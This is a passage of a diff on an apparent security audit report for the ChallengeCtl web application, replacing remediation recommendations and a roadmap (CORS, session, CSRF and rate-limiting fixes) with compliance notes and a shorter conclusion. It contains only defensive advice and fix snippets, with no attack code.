-- No defense-in-depth against script injection
-- Inline scripts can be executed by attackers
-
-**Recommendation:**
-```nginx
-add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' wss://challengectl.example.com" always;
-```
-
----
-
-### 19. 🟡 **Session Token Generation Could Be Stronger**
-
-**Location:** `server/api.py:215`
-
-**Issue:** Using `secrets.token_urlsafe(32)` generates 32 URL-safe characters (~192 bits entropy), which is good but could be better.
-
-**Impact:**
-- Theoretical brute force possible (though highly impractical)
-- Industry best practice recommends 256+ bits
-
-**Recommendation:**
-```python
-session_token = secrets.token_urlsafe(43)  # 256 bits of entropy
-# or
-session_token = secrets.token_hex(32)  # 256 bits, 64 hex chars
-```
-
----
-
-## Low Severity Issues
-
-### 20. 🟢 **Misleading Variable Naming (apiKey vs session_token)**
-
-**Location:** `frontend/src/auth.js:5`
-
-**Issue:** Frontend uses "apiKey" to store session tokens, which is confusing since API keys are separate (for runners).
-
-**Impact:**
-- Code maintainability issues
-- Confusion for developers
-- Potential for bugs
-
-**Recommendation:**
-```javascript
-const sessionToken = ref(localStorage.getItem('sessionToken') || null)
-// Rename throughout codebase for clarity
-```
-
----
-
-### 21. 🟢 **No Multi-Device Session Management**
-
-**Issue:** Users cannot see or revoke active sessions from other devices.
-
-**Impact:**
-- Cannot revoke compromised sessions
-- No visibility into account access
-- Difficult to detect unauthorized access
-
-**Recommendation:**
-- Add session management UI
-- Display active sessions with device info, IP, last activity
-- Allow users to revoke individual sessions
-- Implement "logout all devices" functionality
-
----
-
-### 22. 🟢 **Overly Permissive Development CORS**
-
-**Location:** `server/api.py:76-77`
-
-**Issue:** Comment says "for development" but no environment check.
-
-**Impact:**
-- CORS likely enabled in production
-- Developer might forget to disable
-- Security misconfiguration risk
-
-**Recommendation:**
-```python
-if os.getenv('FLASK_ENV') == 'development':
-    CORS(self.app)
-else:
-    CORS(self.app, origins=os.getenv('ALLOWED_ORIGINS', '').split(','))
-```
-
----
-
-### 23. 🟢 **No Password History to Prevent Reuse**
-
-**Issue:** Users can change password back to a previously used password.
-
-**Impact:**
-- Reduced security if old password was compromised
-- Users might rotate between 2-3 passwords
-
-**Recommendation:**
-- Store hash of last 5 passwords
-- Prevent reuse of previous passwords
-- Add password history table
-
----
-
-## Security Strengths
-
-The system does implement several security best practices:
-
-✅ **Bcrypt password hashing** with automatic salt generation
-✅ **TOTP-based 2FA** using industry-standard pyotp library
-✅ **Parameterized SQL queries** preventing SQL injection
-✅ **Separate authentication** for runners (API keys) and admins (sessions)
-✅ **Session expiration** (24 hours)
-✅ **Password verification** required before password change
-✅ **Account enabled/disabled** flag support
-✅ **TLS 1.2/1.3** enforcement in nginx configuration
-✅ **Security headers** in nginx (HSTS, X-Frame-Options, etc.)
-✅ **Cryptographically secure** random token generation
-✅ **Thread-safe** session management
-✅ **Password change requirement** flag for forced resets
-✅ **Automatic cleanup** of expired sessions
-
----
-
-## Detailed Recommendations
-
-### Immediate Actions (Within 1 Week)
-
-1. **Implement Rate Limiting**
-   - Use Flask-Limiter: `@limiter.limit("5 per minute")` on auth endpoints
-   - Add IP-based throttling
-
-2. **Fix CORS Configuration**
-   ```python
-   CORS(self.app, origins=['https://challengectl.example.com'])
-   self.socketio = SocketIO(self.app, cors_allowed_origins=['https://challengectl.example.com'])
-   ```
-
-3. **Invalidate Sessions on Password Change**
-   ```python
-   def change_password(username, new_hash):
-       # Invalidate all sessions for this user
-       with self.sessions_lock:
-           to_delete = [token for token, session in self.sessions.items()
-                       if session['username'] == username and token != current_token]
-           for token in to_delete:
-               del self.sessions[token]
-   ```
-
-4. **Add Authentication Logging**
-   - Log all login attempts (success/failure)
-   - Include IP, username, timestamp, reason
-
-5. **Implement Constant-Time Username Validation**
-   ```python
-   # Always call bcrypt even for non-existent users
-   dummy_hash = '$2b$12$dummyhashvaluehere...'
-   if not user:
-       bcrypt.checkpw(password.encode('utf-8'), dummy_hash.encode('utf-8'))
-       return jsonify({'error': 'Invalid credentials'}), 401
-   ```
-
-### Short-Term (Within 1 Month)
-
-6. **Migrate to Persistent Session Storage**
-   - Use Redis for session storage
-   - Implement session metadata tracking
-
-7. **Add Account Lockout**
-   - Create failed_attempts table
-   - Lock after 10 failed attempts for 30 minutes
-
-8. **Strengthen Password Policy**
-   - Minimum 12 characters
-   - Require uppercase, lowercase, number, special char
-   - Implement zxcvbn password strength meter
-
-9. **Implement CSRF Protection**
-   - Use Flask-WTF or custom CSRF token implementation
-   - Validate tokens on all state-changing requests
-
-10. **Add WebSocket Authentication**
-    ```python
-    @self.socketio.on('connect')
-    def handle_connect():
-        token = request.args.get('token')
-        if not validate_session_token(token):
-            return False  # Reject connection
-    ```
-
-### Medium-Term (Within 3 Months)
-
-11. **Move Session Tokens from localStorage to HttpOnly Cookies**
-    - Implement cookie-based authentication
-    - Add SameSite=Strict attribute
-    - Implement proper CSRF protection
-
-12. **Implement API Key Rotation**
-    - Add expiration dates to API keys
-    - Implement key generation/revocation API
-    - Store hashed keys in database
-
-13. **Add Session Management UI**
-    - Show active sessions
-    - Allow session revocation
-    - Display login history
-
-14. **Implement Comprehensive Audit Logging**
-    - Log all authentication events
-    - Log all administrative actions
-    - Implement log rotation and retention
-
-15. **Add Security Monitoring & Alerting**
-    - Monitor for brute force attempts
-    - Alert on suspicious patterns
-    - Implement anomaly detection
-
-### Long-Term (Within 6 Months)
-
-16. **Consider OAuth 2.0 / OIDC Implementation**
-    - Support SSO integration
-    - Add social login options
-    - Implement proper token refresh
-
-17. **Implement Security Information and Event Management (SIEM)**
-    - Centralized log aggregation
-    - Real-time threat detection
-    - Automated incident response
-
-18. **Add Penetration Testing**
-    - Regular security audits
-    - Third-party penetration testing
-    - Bug bounty program
-
-19. **Implement Hardware Security Key Support**
-    - Add WebAuthn/FIDO2 support
-    - Phishing-resistant 2FA
-
-20. **Security Hardening**
-    - Implement secrets management (HashiCorp Vault)
-    - Add database encryption at rest
-    - Implement certificate pinning for runners
-
----
-
-## Implementation Priorities
-
-### Priority 1 (Critical - Implement Immediately)
-- Rate limiting on authentication endpoints
-- Fix CORS configuration
-- Session invalidation on password change
-- Authentication failure logging
-- Constant-time password validation
-
-### Priority 2 (High - Implement Within 1 Month)
-- Migrate to Redis-backed sessions
-- Account lockout mechanism
-- CSRF protection
-- Strengthen password policy
-- WebSocket authentication
-
-### Priority 3 (Medium - Implement Within 3 Months)
-- Move to HttpOnly cookies
-- API key rotation
-- Session management UI
-- Audit logging
-- Security monitoring
-
-### Priority 4 (Low - Nice to Have)
-- Variable naming cleanup
-- Multi-device session management
-- Password history
-- Enhanced security headers
-
----
-
-## Testing & Validation
-
-After implementing fixes, validate with:
-
-1. **Automated Security Scanning**
-   - OWASP ZAP
-   - Burp Suite
-   - SQLMap (SQL injection)
-   - XSStrike (XSS detection)
-
-2. **Manual Penetration Testing**
-   - Brute force testing
-   - Session hijacking attempts
-   - CSRF exploitation
-   - Authentication bypass attempts
-
-3. **Code Review**
-   - Security-focused peer review
-   - Static analysis (Bandit for Python)
-   - Dependency vulnerability scanning (Safety, Snyk)
-
-4. **Compliance Validation**
-   - OWASP Top 10 checklist
-   - CWE Top 25 review
-   - NIST Cybersecurity Framework alignment
+## Compliance Considerations
+
+If this system handles sensitive data, consider compliance with:
+- **GDPR:** User data protection, right to erasure, breach notification
+- **SOC 2:** Security controls, access management, logging
+- **PCI DSS:** If handling payment data
+- **NIST Cybersecurity Framework:** Risk management best practices
 
 ---
 
 ## Conclusion
 
-The ChallengeCtl authentication system has a solid foundation with bcrypt and TOTP 2FA, but requires significant hardening to be production-ready. The most critical issues are the lack of rate limiting and CORS misconfiguration, which should be addressed immediately. Implementing the recommendations in this report will significantly improve the security posture and make the system resilient against common attacks.
+ChallengeCtl demonstrates **strong security fundamentals** in authentication, session management, and database security. However, **3 critical vulnerabilities** require immediate attention:
 
-**Estimated Implementation Time:**
-- Priority 1 (Critical): 1-2 weeks
-- Priority 2 (High): 3-4 weeks
-- Priority 3 (Medium): 8-12 weeks
-- Total Effort: ~3-4 months of dedicated security engineering
+1. Command injection in FT8 module
+2. Insecure cookie configuration
+3. Permissive WebSocket CORS
 
-**Risk After Remediation:** LOW to MEDIUM (depending on deployment environment)
+Once these are addressed, the application will have a significantly improved security posture. Regular security testing, dependency updates, and code reviews should be part of the ongoing maintenance process.
 
 ---
 
-**Report prepared by:** Security Analysis Team
-**Review date:** 2025-11-16
-**Next review:** After Priority 1 & 2 implementations
+## References
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [CWE Top 25](https://cwe.mitre.org/top25/)
+- [Flask Security Best Practices](https://flask.palletsprojects.com/en/latest/security/)
+- [Vue.js Security Guide](https://vuejs.org/guide/best-practices/security.html)
+- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/)
+
+---
+
+**Report Generated:** 2025-11-17
+**Next Review:** Recommended within 30 days after remediation
